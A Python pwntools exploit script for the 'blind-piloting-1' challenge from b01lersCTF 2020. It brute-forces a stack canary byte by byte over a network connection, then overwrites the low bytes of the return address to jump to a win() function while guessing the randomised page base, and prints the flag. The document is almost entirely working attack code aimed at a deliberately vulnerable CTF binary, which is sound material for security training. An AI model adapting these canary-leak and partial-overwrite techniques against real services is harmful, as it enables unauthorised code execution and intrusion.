#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/b01lersCTF-2020/blind-piloting-1/'
config = {
        'elf': chdir + 'blindpiloting',
        'libc': chdir + 'libc.so.6',
        'HOST': 'pwn.ctf.b01lers.com',
        'PORT': 1007,
        }

INPUT_PROMPT = None

def exploit(r):
    payload = "A"*8 + "\x00"
    for n in range(7):
        for i in range(256):
            if i == 0xa: continue
            r.sendlineafter('> ', payload + chr(i))
            check = r.recvn(1)
            if check == '>':
                log.info("Found {}th: {}".format(n+2,hex(i)))
                payload += chr(i)
                r.sendline(payload)
                break
            else:
                r.recvline()

    payload += "A"*8
    running = True
    for base in range(0, 0x10000, 0x1000):
        r.sendline(payload + p16(base + 0x9f0)) # win() + 4
        data = r.recvuntil('> ')
        if "{" in data:
            print "Data:", data
            running = False
            break
        log.info('Failed ... @{:#x}'.format(base))
    r.close()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    context.log_level = 'debug'
    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.terminal=['tmux', 'splitw', '-h']
        r = process(e.path, env={'LD_PRELOAD':config['libc']})
    exploit(r)

